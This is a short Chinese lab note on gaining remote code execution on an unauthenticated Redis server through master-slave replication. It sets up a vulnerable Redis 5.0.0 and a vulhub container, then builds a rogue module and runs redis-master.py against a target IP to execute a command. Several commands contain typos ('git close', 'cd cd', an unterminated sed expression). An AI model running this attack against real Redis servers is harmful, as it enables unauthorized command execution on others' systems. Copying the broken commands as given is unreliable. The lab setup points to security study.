## Redis基于主从复制的RCE利用方式
**参考：**

- https://github.com/vulhub/vulhub/tree/master/redis/4-unacc

### 环境搭建

redis环境配置：
```bash
cd /root
wget http://download.redis.io/releases/redis-5.0.0.tar.gz
tar xzf redis-5.0.0.tar.gz
cd redis-5.0.0
make
sed -i 's/127.0.0.1/0.0.0.0' redis.conf
cd src
./redis-server /root/redis-5.0.0.0/redis.conf
```

vulhub:

```bash
url：https://github.com/vulhub/vulhub/tree/master/redis/4-unacc
docker-compose up -d
```



### 攻击

下载脚本并攻击
```bash
git close https://github.com/vulhub/redis-rogue-getshell
apt-get install gcc make
cd cd RedisModulesSDK/exp/
make
python redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp/exp.so -c "id"
```
![](/images/19-7-10_SQL_Redis基于主从复制的RCE利用方式_1.png)